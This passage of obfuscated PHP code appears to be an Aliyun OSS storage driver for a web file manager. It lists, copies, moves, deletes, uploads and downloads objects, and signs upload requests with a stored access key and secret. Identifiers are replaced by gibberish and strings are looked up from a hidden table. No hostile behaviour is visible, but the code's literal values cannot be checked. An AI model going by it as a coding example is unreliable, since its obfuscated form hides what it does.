$¸İ¨í‡â = $°ú÷»†¹->getKey(); $¶¡›ÛÙ¸ = $°ú÷»†¹->getSize(); $¼±îÀÛš = $°ú÷»†¹->getLastModified(); $ˆ¦˜îÍ» = trim($°ú÷»†¹->getETag(), $Ï§ö»”[121]); $ÙäÒš”à = $¯üşÏá‘ ? array($Ï§ö»”[32] => $¸İ¨í‡â, $Ï§ö»”[79] => $¶¡›ÛÙ¸, $Ï§ö»”[206] => strtotime($¼±îÀÛš), $Ï§ö»”[1488] => $ˆ¦˜îÍ») : $¸İ¨í‡â; $ú¶ñö = $¶¡›ÛÙ¸ == 0 && substr($¸İ¨í‡â, strlen($¸İ¨í‡â) - 1, 1) == $Ï§ö»”[8] ? !0 : !1; $Ó„ª­ˆã = array($Ï§ö»”[79] => $¶¡›ÛÙ¸, $Ï§ö»”[1489] => $¶¡›ÛÙ¸, $Ï§ö»”[88] => strtotime($¼±îÀÛš), $Ï§ö»”[1490] => $¼±îÀÛš, $Ï§ö»”[1488] => $ˆ¦˜îÍ»); $this->cacheMethodInfoSet($¸İ¨í‡â, $ú¶ñö, $Ó„ª­ˆã); if ($ú¶ñö) { $¨×è™úº[] = $¸İ¨í‡â; continue; } $¥Öˆúöƒ[] = $ÙäÒš”à; } foreach ($Î—Û¿‚ø as $Êú¿²¤Á) { $¨×è™úº[] = $Êú¿²¤Á->getPrefix(); $this->cacheMethodInfoSet($Êú¿²¤Á->getPrefix(), !0); } if ($Ò–ØÏ¬É === $Ï§ö»”[12]) { break; } } $this->cacheMethodInfoSet($ı»İì·, !0); return array($Ï§ö»”[85] => $¨×è™úº, $Ï§ö»”[86] => $¥Öˆúöƒ); } public function listObject($˜ºÚ‰õ, $™ŞòØ¼§ = '') { $¶«©„‘ñ =& $_SERVER[Ùæõ‰Ï’]; $˜ºÚ‰õ = trim($˜ºÚ‰õ, $¶«©„‘ñ[8]); $ùñß³« = empty($˜ºÚ‰õ) && $˜ºÚ‰õ !== $¶«©„‘ñ[228] ? $¶«©„‘ñ[12] : $˜ºÚ‰õ . $¶«©„‘ñ[8]; $˜¢ÆŸÙÚ = $¶«©„‘ñ[12]; $„Ê¤ºÃŒ = 1000; $¨Ë¿„è = $¼¾–”› = array(); while (!0) { check_abort(); $¯°ô½ñÁ = array($¶«©„‘ñ[1484] => $™ŞòØ¼§, $¶«©„‘ñ[1485] => $ùñß³«, $¶«©„‘ñ[1486] => $„Ê¤ºÃŒ, $¶«©„‘ñ[1487] => $˜¢ÆŸÙÚ); try { $×¹°‡ø = $this->client->listObjects($this->bucket, $¯°ô½ñÁ); } catch (OSS\Core\OssException $…—‰·‘) { $this->writeLog(__FUNCTION__ . $¶«©„‘ñ[214] . $…—‰·‘->getMessage()); break; } $˜¢ÆŸÙÚ = $×¹°‡ø->getNextMarker(); $¸ûŒ¹¸¶ = $×¹°‡ø->getObjectList(); foreach ($¸ûŒ¹¸¶ as $— öŠÀû) { if ($— öŠÀû->getKey() == $ùñß³«) { continue; } $“®©•õË = $— öŠÀû->getKey(); $­›™×›ğ = $— öŠÀû->getSize(); $¢àÏÀÎ = $­›™×›ğ == 0 && substr($“®©•õË, strlen($“®©•õË) - 1, 1) == $¶«©„‘ñ[8] ? !0 : !1; if ($¢àÏÀÎ) { continue; } (yield $­›™×›ğ . $¶«©„‘ñ[214] . $“®©•õË); } if ($˜¢ÆŸÙÚ === $¶«©„‘ñ[12]) { break; } } } public function copyFile($Ò¸ıÒ¬, $‹¤ˆâú©) { $¢‚­Ô = $this->size($Ò¸ıÒ¬); if ($¢‚­Ô < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Ò¸ıÒ¬, $this->bucket, $this->pathEncode($‹¤ˆâú©)); } catch (OSS\Core\OssException $£œïÀ„Ÿ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][214] . $£œïÀ„Ÿ->getMessage()); return !1; } return $this->getPathOuter($‹¤ˆâú©); } $ÀÙæ™–º = $this->multiCopyObject($Ò¸ıÒ¬, $‹¤ˆâú©, $¢‚­Ô); return $ÀÙæ™–º ? $this->getPathOuter($‹¤ˆâú©) : !1; } private function multiCopyObject($†¸Æ²®, $Ú‰²ÓæÈ, $é‘÷Õ») { $òıÎƒâö =& $_SERVER[Ùæõ‰Ï’]; try { $Ö«±¬¡Š = array(); if ($ïˆş½Àº = $this->hashMd5($†¸Æ²®)) { $Ö«±¬¡Š = array(OSS\OssClient::OSS_HEADERS => array($òıÎƒâö[1491] => $ïˆş½Àº)); } $æìÅĞá = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ú‰²ÓæÈ), $Ö«±¬¡Š); $ÔÆØÛ = 1; $©Ï¿Ğ¢ = 0; $ï‚ª…… = array(); $‚ÜÖ—Æ§ = 1024 * 1024 * 10; $Ã¿íºÊª = $this->client->generateMultiuploadParts($é‘÷Õ», $‚ÜÖ—Æ§); foreach ($Ã¿íºÊª as $É»ÆÌêŞ => $ìçÜÊ—’) { $‡‘õñİ£ = $©Ï¿Ğ¢ + (int) $ìçÜÊ—’[$òıÎƒâö[1492]]; $œ‹Ğ¼øÕ = (int) $ìçÜÊ—’[$òıÎƒâö[413]] + $‡‘õñİ£ - 1; $Ÿ±Ã—›ı = array($òıÎƒâö[167] => $‡‘õñİ£, $òıÎƒâö[168] => $œ‹Ğ¼øÕ); $ï‚ª……[] = $this->client->uploadPartCopy($this->bucket, $†¸Æ²®, $this->bucket, $this->pathEncode($Ú‰²ÓæÈ), $ÔÆØÛ, $æìÅĞá, $Ÿ±Ã—›ı); $ÔÆØÛ = $ÔÆØÛ + 1; } $¥·û±Ù™ = array(); foreach ($ï‚ª…… as $É»ÆÌêŞ => $ë©Ü›Ï) { $¥·û±Ù™[] = array($òıÎƒâö[308] => $É»ÆÌêŞ + 1, $òıÎƒâö[309] => $ë©Ü›Ï); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ú‰²ÓæÈ), $æìÅĞá, $¥·û±Ù™); } catch (OSS\Core\OssException $é¨¨ƒ¢) { $this->writeLog(__FUNCTION__ . $òıÎƒâö[214] . $é¨¨ƒ¢->getMessage()); return !1; } return !0; } public function moveFile($Û‘ìÍÓù, $øúæøÑş) { if ($this->copyFile($Û‘ìÍÓù, $øúæøÑş)) { $this->remove($Û‘ìÍÓù); return $this->getPathOuter($øúæøÑş); } return !1; } public function delFile($Ö¢›Òº) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ö¢›Òº)); } catch (OSS\Core\OssException $Ï™Æ…Ç) { $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][214] . $Ï™Æ…Ç->getMessage()); return !1; } return !0; } public function delFolder($ç‰ÏéÌŒ) { $éªË”ÃË =& $_SERVER[Ùæõ‰Ï’]; if (!$this->exist($ç‰ÏéÌŒ)) { return !0; } $this->listItemCache = !1; $äêôÌñ‡ = $this->fileList($ç‰ÏéÌŒ); $this->listItemCache = !0; $›Ë„Ì£ = trim($ç‰ÏéÌŒ, $éªË”ÃË[8]) . $éªË”ÃË[8]; if (!empty($ç‰ÏéÌŒ) && $ç‰ÏéÌŒ !== $éªË”ÃË[228] && !in_array($›Ë„Ì£, $äêôÌñ‡[$éªË”ÃË[85]])) { $äêôÌñ‡[$éªË”ÃË[85]][] = $›Ë„Ì£; } $ëéî²—ï = $this->delByBatch($äêôÌñ‡[$éªË”ÃË[86]]); if (!$ëéî²—ï) { return !1; } $ëéî²—ï = $this->delByBatch($äêôÌñ‡[$éªË”ÃË[85]]); if (!$ëéî²—ï) { return !1; } return $this->delFile($›Ë„Ì£); } private function delByBatch($¿ß¥É£¢) { foreach (array_chunk($¿ß¥É£¢, 1000) as $Æãç×…Œ) { try { $this->client->deleteObjects($this->bucket, $Æãç×…Œ); } catch (OSS\Core\OssException $½ÄÄ¶óÌ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][214] . $½ÄÄ¶óÌ->getMessage()); return !1; } } return !0; } public function rename($‡Ù‚÷Ú, $û´û³£) { return $this->renameObject($‡Ù‚÷Ú, $û´û³£); } private function fileInfo($š¾³Æ¨§, $”¹“ƒÚü = false, $ëåûï‰š = array()) { $ÑÍ€ï±ã =& $_SERVER[Ùæõ‰Ï’]; $èƒĞäŠ’ = array($ÑÍ€ï±ã[32] => $this->pathThis($š¾³Æ¨§), $ÑÍ€ï±ã[87] => $this->getPathOuter($š¾³Æ¨§), $ÑÍ€ï±ã[33] => $ÑÍ€ï±ã[230], $ÑÍ€ï±ã[79] => isset($ëåûï‰š[$ÑÍ€ï±ã[79]]) ? $ëåûï‰š[$ÑÍ€ï±ã[79]] : 0, $ÑÍ€ï±ã[169] => $this->ext($š¾³Æ¨§)); if ($”¹“ƒÚü) { return $èƒĞäŠ’; } $èƒĞäŠ’[$ÑÍ€ï±ã[231]] = $èƒĞäŠ’[$ÑÍ€ï±ã[88]] = 0; $èƒĞäŠ’[$ÑÍ€ï±ã[232]] = $èƒĞäŠ’[$ÑÍ€ï±ã[233]] = !0; if (empty($ëåûï‰š)) { $—ˆ‡üÏ´ = $this->objectMeta($š¾³Æ¨§); if (!$—ˆ‡üÏ´) { return $èƒĞäŠ’; } $ëåûï‰š = array($ÑÍ€ï±ã[88] => strtotime($—ˆ‡üÏ´[$ÑÍ€ï±ã[1490]]), $ÑÍ€ï±ã[79] => $—ˆ‡üÏ´[$ÑÍ€ï±ã[1489]] + 0, $ÑÍ€ï±ã[1488] => $—ˆ‡üÏ´[$ÑÍ€ï±ã[1488]]); } if (isset($ëåûï‰š[$ÑÍ€ï±ã[1488]]) && $ëåûï‰š[$ÑÍ€ï±ã[1488]]) { $èƒĞäŠ’[$ÑÍ€ï±ã[235]] = trim($ëåûï‰š[$ÑÍ€ï±ã[1488]], $ÑÍ€ï±ã[121]); } if (isset($ëåûï‰š[$ÑÍ€ï±ã[79]])) { $èƒĞäŠ’[$ÑÍ€ï±ã[79]] = $ëåûï‰š[$ÑÍ€ï±ã[79]]; } if (isset($ëåûï‰š[$ÑÍ€ï±ã[88]])) { $èƒĞäŠ’[$ÑÍ€ï±ã[88]] = $ëåûï‰š[$ÑÍ€ï±ã[88]]; } if (isset($ëåûï‰š[$ÑÍ€ï±ã[206]]) && !trim($èƒĞäŠ’[$ÑÍ€ï±ã[88]])) { $èƒĞäŠ’[$ÑÍ€ï±ã[88]] = $ëåûï‰š[$ÑÍ€ï±ã[206]]; } return $èƒĞäŠ’; } private function folderInfo($ª«™Ïº, $¿±¹ä = false, $õêİ©£á = array()) { $ŒÀŒÑ‘Ã =& $_SERVER[Ùæõ‰Ï’]; $ÌÑµ¯ÉÆ = array($ŒÀŒÑ‘Ã[32] => $this->pathThis($ª«™Ïº), $ŒÀŒÑ‘Ã[87] => $this->getPathOuter($ŒÀŒÑ‘Ã[8] . $ª«™Ïº), $ŒÀŒÑ‘Ã[33] => $ŒÀŒÑ‘Ã[78]); if ($¿±¹ä) { return $ÌÑµ¯ÉÆ; } $ÌÑµ¯ÉÆ[$ŒÀŒÑ‘Ã[231]] = $ÌÑµ¯ÉÆ[$ŒÀŒÑ‘Ã[88]] = 0; $ÌÑµ¯ÉÆ[$ŒÀŒÑ‘Ã[232]] = $ÌÑµ¯ÉÆ[$ŒÀŒÑ‘Ã[233]] = !0; if (empty($õêİ©£á)) { $ª«™Ïº = rtrim($ª«™Ïº, $ŒÀŒÑ‘Ã[8]) . $ŒÀŒÑ‘Ã[8]; $²¯é¨â = $this->objectMeta($ª«™Ïº); if (!$²¯é¨â) { return $ÌÑµ¯ÉÆ; } $õêİ©£á = array($ŒÀŒÑ‘Ã[231] => $²¯é¨â[$ŒÀŒÑ‘Ã[575]][$ŒÀŒÑ‘Ã[1493]], $ŒÀŒÑ‘Ã[88] => strtotime($²¯é¨â[$ŒÀŒÑ‘Ã[1490]])); } if (isset($õêİ©£á[$ŒÀŒÑ‘Ã[88]])) { $ÌÑµ¯ÉÆ[$ŒÀŒÑ‘Ã[88]] = $õêİ©£á[$ŒÀŒÑ‘Ã[88]]; } if (isset($õêİ©£á[$ŒÀŒÑ‘Ã[231]])) { $ÌÑµ¯ÉÆ[$ŒÀŒÑ‘Ã[231]] = $õêİ©£á[$ŒÀŒÑ‘Ã[231]]; } return $ÌÑµ¯ÉÆ; } public function listPath($ûş«³ÚÒ, $‡¬çÜ€ = false) { $­äÏìïÒ =& $_SERVER[Ùæõ‰Ï’]; $á•¡Çïô = $this->fileList($ûş«³ÚÒ, $­äÏìïÒ[8], !0); foreach ($á•¡Çïô[$­äÏìïÒ[85]] as $ª•óûû => $î‚Ò„ÓÙ) { $á•¡Çïô[$­äÏìïÒ[85]][$ª•óûû] = $this->folderInfo($î‚Ò„ÓÙ, $‡¬çÜ€, $î‚Ò„ÓÙ); } foreach ($á•¡Çïô[$­äÏìïÒ[86]] as $ª•óûû => $î‚Ò„ÓÙ) { $á•¡Çïô[$­äÏìïÒ[86]][$ª•óûû] = $this->fileInfo($î‚Ò„ÓÙ[$­äÏìïÒ[32]], $‡¬çÜ€, $î‚Ò„ÓÙ); } return $á•¡Çïô; } protected function infoChildren($üáÆ¼¡†, &$ËÙ±ÆûÒ) { $Á‚ÀÓ “ =& $_SERVER[Ùæõ‰Ï’]; $÷ ©ëÀÔ = $this->fileList($üáÆ¼¡†, $Á‚ÀÓ “[12], !0); $ËÙ±ÆûÒ[$Á‚ÀÓ “[81]] += count($÷ ©ëÀÔ[$Á‚ÀÓ “[85]]); $ËÙ±ÆûÒ[$Á‚ÀÓ “[80]] += count($÷ ©ëÀÔ[$Á‚ÀÓ “[86]]); foreach ($÷ ©ëÀÔ[$Á‚ÀÓ “[86]] as $ıÎìÆ¯à) { if (!$ıÎìÆ¯à || !$ıÎìÆ¯à[$Á‚ÀÓ “[79]]) { continue; } $ËÙ±ÆûÒ[$Á‚ÀÓ “[79]] += $ıÎìÆ¯à[$Á‚ÀÓ “[79]]; } } public function has($ŠŠÓõ÷, $à«‹ù©â = false, $èŸ’‰ß = true) { $ôÖ¶…“ú =& $_SERVER[Ùæõ‰Ï’]; $ŠŠÓõ÷ = trim($ŠŠÓõ÷, $ôÖ¶…“ú[8]); $«…É“Æ = empty($ŠŠÓõ÷) && $ŠŠÓõ÷ !== $ôÖ¶…“ú[228] ? $ôÖ¶…“ú[12] : $ŠŠÓõ÷ . $ôÖ¶…“ú[8]; $¥úèâƒ— = $ôÖ¶…“ú[12]; $ï–µüÉó = 500; $ó®Šóß = $±±Ë¨÷¨ = 0; while (!0) { check_abort(); $ßÊÈ®Şƒ = array($ôÖ¶…“ú[1484] => $ôÖ¶…“ú[8], $ôÖ¶…“ú[1485] => $«…É“Æ, $ôÖ¶…“ú[1486] => $ï–µüÉó, $ôÖ¶…“ú[1487] => $¥úèâƒ—); try { $Å©«‰Î = $this->client->listObjects($this->bucket, $ßÊÈ®Şƒ); } catch (OSS\Core\OssException $¿¤Ö´Õ) { $this->writeLog(__FUNCTION__ . $ôÖ¶…“ú[214] . $¿¤Ö´Õ->getMessage()); break; } $¥úèâƒ— = $Å©«‰Î->getNextMarker(); $öŒ¥Õ¥Á = $Å©«‰Î->getObjectList(); $ÏöÌŒ‘Á = $Å©«‰Î->getPrefixList(); if ($à«‹ù©â) { if (count($öŒ¥Õ¥Á) > 1 || count($öŒ¥Õ¥Á) == 1 && $öŒ¥Õ¥Á[0]->getKey() != $«…É“Æ) { $ó®Šóß += count($öŒ¥Õ¥Á) - 1; } if (!empty($ÏöÌŒ‘Á)) { $±±Ë¨÷¨ += count($ÏöÌŒ‘Á); } if ($¥úèâƒ— === $ôÖ¶…“ú[12]) { break; } continue; } if ($èŸ’‰ß) { if (!empty($öŒ¥Õ¥Á)) { if (count($öŒ¥Õ¥Á) > 1 || $öŒ¥Õ¥Á[0]->getKey() != $«…É“Æ) { return !0; } } } else { if (!empty($ÏöÌŒ‘Á)) { return !0; } } if ($¥úèâƒ— === $ôÖ¶…“ú[12]) { break; } } if ($à«‹ù©â) { return array($ôÖ¶…“ú[239] => $ó®Šóß, $ôÖ¶…“ú[240] => $±±Ë¨÷¨); } return !1; } public function listAll($µÎ›ãœ) { $‰¡¦™ÙŒ =& $_SERVER[Ùæõ‰Ï’]; $ü®çÎ¸Ù = $this->fileList($µÎ›ãœ, $‰¡¦™ÙŒ[12], !0); $‰×Ù£° = array_to_keyvalue($ü®çÎ¸Ù[$‰¡¦™ÙŒ[86]], $‰¡¦™ÙŒ[32]); foreach ($ü®çÎ¸Ù[$‰¡¦™ÙŒ[85]] as $´§ƒ“¡”) { if (is_string($´§ƒ“¡”)) { $‰×Ù£°[$´§ƒ“¡”] = array($‰¡¦™ÙŒ[79] => 0); } } return $this->listAllFiles($µÎ›ãœ, $‰×Ù£°); } public function canRead($˜åğ¡ÄÒ) { $ĞÀÈÊô =& $_SERVER[Ùæõ‰Ï’]; $œÈÒÅ‘¡ = $this->pathAcl($˜åğ¡ÄÒ); return $œÈÒÅ‘¡ == $ĞÀÈÊô[1494] || $œÈÒÅ‘¡ == $ĞÀÈÊô[619] ? !0 : !1; } public function canWrite($ÊÌÉÉ•¢) { $Î‡ÀÄ®é = $this->pathAcl($ÊÌÉÉ•¢); return $Î‡ÀÄ®é == $_SERVER[Ùæõ‰Ï’][619] ? !0 : !1; } public function pathAcl($û»˜½Ü) { $ôÇâ‰½‰ =& $_SERVER[Ùæõ‰Ï’]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¯÷–·êÄ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($û»˜½Ü)); } catch (OSS\Core\OssException $»Ÿ•¢ß) { $this->writeLog(__FUNCTION__ . $ôÇâ‰½‰[214] . $»Ÿ•¢ß->getMessage()); return !1; } $ô’µ³ü¹ = $¯÷–·êÄ == $ôÇâ‰½‰[37] ? $this->bucketAcl : $¯÷–·êÄ; if ($ô’µ³ü¹ == $ôÇâ‰½‰[1495]) { return $ôÇâ‰½‰[1494]; } if ($ô’µ³ü¹ == $ôÇâ‰½‰[1496]) { return $ôÇâ‰½‰[619]; } return $ô’µ³ü¹; } private function chmodPath($œë••×, $âÌíáù = '') { $€‹ÍôßÕ =& $_SERVER[Ùæõ‰Ï’]; $ÊÎùØ¥ó = empty($âÌíáù) ? $€‹ÍôßÕ[1496] : $âÌíáù; $¿¯Ÿ‹ª = array($€‹ÍôßÕ[37], $€‹ÍôßÕ[229], $€‹ÍôßÕ[1495], $€‹ÍôßÕ[1496]); if (!in_array($ÊÎùØ¥ó, $¿¯Ÿ‹ª)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($œë••×), $ÊÎùØ¥ó); } catch (OSS\Core\OssException $×«¤©ê¢) { $this->writeLog(__FUNCTION__ . $€‹ÍôßÕ[214] . $×«¤©ê¢->getMessage()); return !1; } return !0; } public function getContent($Î‰Õ´¡Ò) { return $this->fileSubstr($Î‰Õ´¡Ò, -1); } public function setContent($¥¹°Î‘¼, $âÕéó¯ = '') { $–ÍéÃŒ· =& $_SERVER[Ùæõ‰Ï’]; try { $…®Ô¤ŠÒ = $this->trafficLimit($–ÍéÃŒ·[1497]); $ş€ğÇò² = $this->client->putObject($this->bucket, $this->pathEncode($¥¹°Î‘¼), $âÕéó¯, $…®Ô¤ŠÒ); } catch (OSS\Core\OssException $œ«èûæ) { $this->writeLog(__FUNCTION__ . $–ÍéÃŒ·[214] . $œ«èûæ->getMessage()); return !1; } $ğŠ€©± = array($–ÍéÃŒ·[1491] => trim($ş€ğÇò²[$–ÍéÃŒ·[1488]], $–ÍéÃŒ·[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¥¹°Î‘¼))); $this->updateObjMeta($¥¹°Î‘¼, $ğŠ€©±); return isset($ş€ğÇò²[$–ÍéÃŒ·[1498]][$–ÍéÃŒ·[292]]) ? !0 : !1; } private function updateObjMeta($Èäõ¢İ, $´‚ÆòÍ) { $Èäõ¢İ = $this->pathEncode($Èäõ¢İ); try { $ıºû÷§„ = array(OSS\OssClient::OSS_HEADERS => $´‚ÆòÍ); $this->client->copyObject($this->bucket, $Èäõ¢İ, $this->bucket, $Èäõ¢İ, $ıºû÷§„); } catch (OSS\Core\OssException $¿ê†¨ÖØ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][214] . $¿ê†¨ÖØ->getMessage()); return !1; } return !0; } public function upload($ÙæÙ……×, $ÅŠ¸âü, $ï¬¾şÔã = false, $Å–¢æ˜ = REPEAT_REPLACE) { $ğîòŠ˜Ê =& $_SERVER[Ùæõ‰Ï’]; $æÕÅ¯¹’ = trim($ÙæÙ……×, $ğîòŠ˜Ê[8]); $ÓÀù”Î¦ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ğîòŠ˜Ê[1491] => @md5_file($ÅŠ¸âü)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÙæÙ……×))); $ÓÀù”Î¦ = $this->trafficLimit($ğîòŠ˜Ê[1497], $ÓÀù”Î¦); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($æÕÅ¯¹’), $ÅŠ¸âü, $ÓÀù”Î¦); } catch (OSS\Core\OssException $áùŒÇº€) { $this->writeLog(__FUNCTION__ . $ğîòŠ˜Ê[214] . $áùŒÇº€->getMessage()); return !1; } return $this->getPathOuter($ÙæÙ……×); } public function getHost() { $ßíı¿‹Ó =& $_SERVER[Ùæõ‰Ï’]; $¯¡„ÜÏ¨ = explode($ßíı¿‹Ó[210], parent::getHost()); return $¯¡„ÜÏ¨[0] . $ßíı¿‹Ó[210] . $this->bucket . $ßíı¿‹Ó[10] . $¯¡„ÜÏ¨[1]; } public function uploadFormData($‘±‰Øãæ, $ØÜÀ¨öÄ = 3600) { $’¸ÃÕ”Š =& $_SERVER[Ùæõ‰Ï’]; if (!($œ£Œ½Œ¸ = $this->getHost())) { return !1; } $íŸÎ¦ó– = $ØÜÀ¨öÄ; $£ßï³ª• = date($’¸ÃÕ”Š[1499], time() + $íŸÎ¦ó–); $éƒ¯Ã¶ = new DateTime($£ßï³ª•); $»Šû”Áå = $éƒ¯Ã¶->format(DateTime::ISO8601); $¥¾Ç­Ñ = strpos($»Šû”Áå, $’¸ÃÕ”Š[372]); $»Šû”Áå = substr($»Šû”Áå, 0, $¥¾Ç­Ñ) . $’¸ÃÕ”Š[1500]; $ı”¾±îÜ = 1048576000 * 5; $‰±ÃÖ‡ = $this->pathFather($‘±‰Øãæ); $À›Š×‹ó = array($’¸ÃÕ”Š[275] => $»Šû”Áå, $’¸ÃÕ”Š[278] => array(array($’¸ÃÕ”Š[1501], 0, $ı”¾±îÜ), array($’¸ÃÕ”Š[281], $’¸ÃÕ”Š[282], $‰±ÃÖ‡))); $í¡‹’ÛÅ = base64_encode(json_encode($À›Š×‹ó)); $ØÒÓÎÑ£ = base64_encode(hash_hmac($’¸ÃÕ”Š[263], $í¡‹’ÛÅ, $this->secret, !0)); $ú¢ë‚×¯ = array($’¸ÃÕ”Š[293] => $í¡‹’ÛÅ, $’¸ÃÕ”Š[1502] => $this->accessKey, $’¸ÃÕ”Š[285] => $’¸ÃÕ”Š[274], $’¸ÃÕ”Š[1503] => $ØÒÓÎÑ£, $’¸ÃÕ”Š[208] => $œ£Œ½Œ¸); $ú¢ë‚×¯ = $this->trafficLimit($’¸ÃÕ”Š[1497], $ú¢ë‚×¯); return $ú¢ë‚×¯; } public function multiUploadFormData($Ìçï’Û, $×şà˜´Æ = 3600) { $‰Ç„’ä =& $_SERVER[Ùæõ‰Ï’]; if (!($ó™¸œØš = $this->getHost())) { return !1; } $ ÔŠ¬®ı = $this->trafficLimit($‰Ç„’ä[1497]); $°ÇõÓÚô = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ìçï’Û), $ ÔŠ¬®ı); return array($‰Ç„’ä[254] => $°ÇõÓÚô, $‰Ç„’ä[208] => $ó™¸œØš . $‰Ç„’ä[8] . $this->pathEncode($Ìçï’Û), $‰Ç„’ä[255] => gmdate($‰Ç„’ä[1504]), $‰Ç„’ä[97] => $Ìçï’Û); } public function multiUploadAuthData($§Ë‡òÖ°, $£ô¤˜³ = array()) { $›şŒÒ‡Ñ =& $_SERVER[Ùæõ‰Ï’]; $™şĞÈ = isset($£ô¤˜³[$›şŒÒ‡Ñ[255]]) ? $£ô¤˜³[$›şŒÒ‡Ñ[255]] : gmdate($›şŒÒ‡Ñ[1504]); $ØÇÖª© = isset($£ô¤˜³[$›şŒÒ‡Ñ[169]]) ? $£ô¤˜³[$›şŒÒ‡Ñ[169]] : $›şŒÒ‡Ñ[12]; $‹›şÊ÷š = $§Ë‡òÖ°; if (isset($£ô¤˜³[$›şŒÒ‡Ñ[97]])) { $‹›şÊ÷š = $£ô¤˜³[$›şŒÒ‡Ñ[97]]; unset($£ô¤˜³[$›şŒÒ‡Ñ[97]]); } if (isset($£ô¤˜³[$›şŒÒ‡Ñ[256]])) { $£ô¤˜³[$›şŒÒ‡Ñ[255]] = $™şĞÈ; return $this->listUploadParts($‹›şÊ÷š, $£ô¤˜³); } $Æ‡®Ş”ş = array($›şŒÒ‡Ñ[257], $›şŒÒ‡Ñ[12], $›şŒÒ‡Ñ[123], $™şĞÈ, "\x78\x2d\x6f\163\163\55\x64\141\164\145\72{$™şĞÈ}", $›şŒÒ‡Ñ[8] . $this->bucket . $›şŒÒ‡Ñ[8] . $‹›şÊ÷š . $ØÇÖª©); if (strpos($ØÇÖª©, $›şŒÒ‡Ñ[258]) === 0) { $Æ‡®Ş”ş[0] = $›şŒÒ‡Ñ[259]; if ($áÚ®ËÚ› = $this->trafficLimit($›şŒÒ‡Ñ[1497])) { $‹›şÊ÷š = $›şŒÒ‡Ñ[1505]; array_splice($Æ‡®Ş”ş, 5, 0, $‹›şÊ÷š . $›şŒÒ‡Ñ[4] . $áÚ®ËÚ›[$‹›şÊ÷š]); } } if (isset($£ô¤˜³[$›şŒÒ‡Ñ[260]]) && $£ô¤˜³[$›şŒÒ‡Ñ[260]] == $›şŒÒ‡Ñ[261]) { $Æ‡®Ş”ş[0] = $›şŒÒ‡Ñ[261]; } if (!empty($£ô¤˜³[$›şŒÒ‡Ñ[1506]])) { $áÖêîŞˆ = array_merge(array($Æ‡®Ş”ş[4]), $£ô¤˜³[$›şŒÒ‡Ñ[1506]]); sort($áÖêîŞˆ); $Æ‡®Ş”ş[4] = implode($›şŒÒ‡Ñ[262], $áÖêîŞˆ); } $ˆæ ˜£É = implode($›şŒÒ‡Ñ[262], $Æ‡®Ş”ş); $Ş—ÜÇ„× = base64_encode(hash_hmac($›şŒÒ‡Ñ[263], $ˆæ ˜£É, $this->secret, !0)); $êÌö¹Û = $›şŒÒ‡Ñ[1474] . $this->accessKey . $›şŒÒ‡Ñ[4] . $Ş—ÜÇ„×; if (strpos($ØÇÖª©, $›şŒÒ‡Ñ[258]) === 0) { $êÌö¹Û = array($›şŒÒ‡Ñ[265] => $êÌö¹Û, $›şŒÒ‡Ñ[255] => $™şĞÈ); if ($áÚ®ËÚ›) { $êÌö¹Û = array_merge($êÌö¹Û, $áÚ®ËÚ›); } } return $êÌö¹Û; } public function listUploadParts($¯‹¬ËÃé, $¸üó¥‹¢) { $§Í»ã‚  =& $_SERVER[Ùæõ‰Ï’]; $€Õ’¦‰³ = parse_url_query($¸üó¥‹¢[$§Í»ã‚ [169]]); $Æ±•Æ¥½ = $this->client->listParts($this->bucket, $this->pathEncode($¯‹¬ËÃé), $€Õ’¦‰³[$§Í»ã‚ [254]]); $Éô·ù€é = $Æ±•Æ¥½->getListPart(); $¤Åï»òä = array(); foreach ($Éô·ù€é as $ËÇŸ½ã¡) { $¤Åï»òä[] = array($§Í»ã‚ [308] => $ËÇŸ½ã¡->getPartNumber(), $§Í»ã‚ [309] => trim($ËÇŸ½ã¡->getETag(), $§Í»ã‚ [121])); } unset($¸üó¥‹¢[$§Í»ã‚ [256]], $¸üó¥‹¢[$§Í»ã‚ [260]]); $ÓĞÍŸ = $this->multiUploadAuthData($¯‹¬ËÃé, $¸üó¥‹¢); if (empty($ÓĞÍŸ)) { return !1; } return array($§Í»ã‚ [265] => $ÓĞÍŸ, $§Í»ã‚ [255] => $¸üó¥‹¢[$§Í»ã‚ [255]], $§Í»ã‚ [267] => $¤Åï»òä); } public function download($Ë’œôä«, $ƒõÀÀí) { $•ÍÃı’å =& $_SERVER[Ùæõ‰Ï’]; if ($this->isFolder($Ë’œôä«)) { return !1; } try { $¯Ä¢í„ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ƒõÀÀí); $¯Ä¢í„ = $this->trafficLimit($•ÍÃı’å[112], $¯Ä¢í„); $this->client->getObject($this->bucket, $this->pathEncode($Ë’œôä«), $¯Ä¢í„); } catch (OSS\Core\OssException $î¿©“í”) { $this->writeLog(__FUNCTION__ . $•ÍÃı’å[214] . $î¿©“í”->getMessage()); return !1; } return $ƒõÀÀí; } public function fileSubstr($¶ŒëĞ´, $Ø¢ÌëÍ = 0, $¹©„÷Æ• = false) { if ($Ø¢ÌëÍ === -1) { $ô÷±“•ğ = array(); } else { if ($¹©„÷Æ• === !1) { $­ø âºÜ = $this->size($¶ŒëĞ´); } else { $­ø âºÜ = $Ø¢ÌëÍ + $¹©„÷Æ• - 1; } $ô÷±“•ğ = array(OSS\OssClient::OSS_RANGE => "{$Ø¢ÌëÍ}\x2d{$­ø âºÜ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($¶ŒëĞ´), $ô÷±“•ğ); } catch (OSS\Core\OssException $Â—ûã™ü) { $this->writeLog(__FUNCTION__ . 